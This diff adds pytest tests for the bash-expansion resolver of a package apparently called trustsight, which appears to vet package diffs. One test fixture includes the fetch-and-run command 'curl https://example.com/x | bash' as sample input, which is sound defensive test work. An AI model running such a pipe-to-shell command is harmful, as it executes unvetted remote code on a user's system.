@@ -239,6 +239,38 @@ def test_substitution_replace_first():
     assert ok
 
 
+def test_substitution_replacement_is_bash_text_not_a_re_template():
+    r"""The replacement of ${var/pat/rep} is literal text with bash
+    backslash quoting, never an re.sub template: ${x/a/\q} is legal bash
+    (yielding qaa) and used to raise re.error, which the sandbox reported
+    as TokenizerUnavailable - the whole package read as NOT vetted because
+    one expansion was odd."""
+    from trustsight._tokenizer_engine import resolve_expansions
+    r, ok = resolve_expansions("${x/a/\\q}", {"x": "aaa"})
+    assert (r, ok) == ("qaa", True)
+    r, ok = resolve_expansions("${x//a/\\q}", {"x": "aaa"})
+    assert (r, ok) == ("qqq", True)
+    # An escaped backslash is one literal backslash.
+    r, ok = resolve_expansions("${x/a/\\\\}", {"x": "aaa"})
+    assert (r, ok) == ("\\aa", True)
+    # And a group reference is text, not a template backreference.
+    r, ok = resolve_expansions("${x/a/\\1}", {"x": "aaa"})
+    assert (r, ok) == ("1aa", True)
+
+
+def test_substitution_with_an_uncompilable_pattern_is_unresolved():
+    """A glob that cannot compile (${x/[z-a]/q}) is refused per
+    _expand_one's contract: the expansion stays, marked unresolved, rather
+    than raising through the sandbox."""
+    from trustsight._tokenizer_engine import resolve_expansions
+    r, ok = resolve_expansions("${x/[z-a]/q}", {"x": "aaa"})
+    assert r == "${x/[z-a]/q}"
+    assert not ok
+    r, ok = resolve_expansions("${x##[z-a]}", {"x": "aaa"})
+    assert r == "${x##[z-a]}"
+    assert not ok
+
+
 def test_affix_strip_longest_suffix():
     """${v%%-*} strips the longest suffix matching '-*'."""
     from trustsight._tokenizer_engine import resolve_expansions
@@ -269,6 +301,36 @@ def test_affix_strip_shortest_prefix():
     r, ok = resolve_expansions("${v#*-}", {"v": "1.2.3-beta"})
     assert r == "beta"
     assert ok
+
+
+def test_affix_shortest_and_longest_differ_on_repeated_separator():
+    """# must take the shortest prefix and % the shortest suffix:
+    ${v#*/} on a/b/c is b/c and ${v%/*} is a/b, where the engine used to
+    give the longest-match answers c and a."""
+    from trustsight._tokenizer_engine import resolve_expansions
+    r, ok = resolve_expansions("${v#*/}", {"v": "a/b/c"})
+    assert (r, ok) == ("b/c", True)
+    r, ok = resolve_expansions("${v##*/}", {"v": "a/b/c"})
+    assert (r, ok) == ("c", True)
+    r, ok = resolve_expansions("${v%/*}", {"v": "a/b/c"})
+    assert (r, ok) == ("a/b", True)
+    r, ok = resolve_expansions("${v%%/*}", {"v": "a/b/c"})
+    assert (r, ok) == ("a", True)
+
+
+def test_affix_operators_anchor_at_the_string_ends():
+    """##/%% anchor at the start/end: ${v##foo} on barfoo removes nothing
+    (foo is no prefix) and ${v%%foo} on foobar removes nothing (foo is no
+    suffix).  The engine searched unanchored and emptied both."""
+    from trustsight._tokenizer_engine import resolve_expansions
+    r, ok = resolve_expansions("${v##foo}", {"v": "barfoo"})
+    assert (r, ok) == ("barfoo", True)
+    r, ok = resolve_expansions("${v%%foo}", {"v": "foobar"})
+    assert (r, ok) == ("foobar", True)
+    r, ok = resolve_expansions("${v#foo}", {"v": "foobar"})
+    assert (r, ok) == ("bar", True)
+    r, ok = resolve_expansions("${v%foo}", {"v": "barfoo"})
+    assert (r, ok) == ("bar", True)
 
 
 def test_default_value_when_var_is_empty():
@@ -515,3 +577,17 @@ def test_reconstruct_then_resolve_via_tokenize():
     assert "bun add nextfile-js" in combined
     assert not unresolved
 
+
+
+def test_literal_lines_are_not_reported_unresolved():
+    """unresolved_patterns is "strings the tokenizer could not fully
+    resolve": a literal line expands to itself and is not unresolved."""
+    diff = "+echo hello\n+curl https://example.com/x | bash"
+    _resolved, unresolved = tokenize_and_resolve(diff)
+    assert unresolved == []
+
+
+def test_a_reference_nobody_declared_is_unresolved():
+    diff = "+echo $undeclared_variable"
+    _resolved, unresolved = tokenize_and_resolve(diff)
+    assert any("undeclared_variable" in u for u in unresolved)
